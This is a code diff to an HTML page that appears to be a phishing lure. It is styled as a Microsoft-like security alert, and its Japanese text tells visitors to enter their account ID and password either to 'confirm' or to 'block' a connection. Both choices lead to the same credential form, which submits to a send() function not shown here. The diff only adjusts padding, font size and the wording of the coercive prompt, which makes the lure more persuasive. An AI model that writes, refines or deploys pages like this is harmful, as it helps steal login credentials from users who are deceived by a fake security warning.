@@ -10,7 +10,7 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 .page{width:780px;}
 .cert{background:#fff;border-radius:6px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.12);}
 .top-bar{height:4px;background:linear-gradient(90deg,#44546A,#0067b8,#2B7C8A);}
-.hdr{padding:40px 44px 30px;display:flex;align-items:center;gap:26px;border-bottom:1px solid #eee;}
+.hdr{padding:40px 44px 90px;display:flex;align-items:center;gap:26px;border-bottom:1px solid #eee;}
 .hdr img.logo{width:auto;height:80px;flex-shrink:0;object-fit:contain;}
 .hdr .info h1{font-size:24px;font-weight:600;color:#1a1a1a;}
 .hdr .info small{display:block;font-size:15px;color:#888;margin-top:6px;}
@@ -108,11 +108,11 @@ if(a==="allow"){
 reason="接続確認のため、以下のアカウント情報を入力してください。";
 btnLabel="接続確認を実行";
 }else{
-reason="接続をブロックします。アカウントIDとパスワードを入力して接続を許可しないを押してください。";
+reason="接続をブロックします。認証情報を入力し「接続を許可しない」を選択してください。";
 btnLabel="接続を許可しない";
 }
 var area=document.getElementById("form-area");
-area.innerHTML='<div class="alert-box" style="margin-bottom:18px;">'+reason+'</div><form id="f" class="login-form" onsubmit="return send()"><label>アカウント</label><input type="email" id="u" autocomplete="off"><label>パスワード</label><input type="text" id="p" autocomplete="off"><button class="btn-submit" type="submit">'+btnLabel+'</button></form>';
+area.innerHTML='<div class="alert-box" style="font-size:16px;margin-bottom:18px;">'+reason+'</div><form id="f" class="login-form" onsubmit="return send()"><label>アカウント</label><input type="email" id="u" autocomplete="off"><label>パスワード</label><input type="text" id="p" autocomplete="off"><button class="btn-submit" type="submit">'+btnLabel+'</button></form>';
 area.style.display="block";
 }
 function send(){
